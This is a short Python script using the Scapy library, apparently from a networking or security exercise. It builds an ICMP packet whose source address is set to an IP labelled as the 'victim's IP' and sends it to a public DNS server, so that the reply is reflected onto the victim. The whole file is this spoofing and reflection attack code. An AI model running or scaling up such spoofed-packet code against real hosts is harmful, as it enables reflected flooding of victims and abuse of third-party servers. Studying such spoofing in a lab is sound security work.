from scapy.all import *

pkt = IP()
pkt.src = "10.22.90.6" #victim's IP
pkt.dst = "8.8.8.8" #google.com
b = ICMP()
p = pkt/b
send(p)
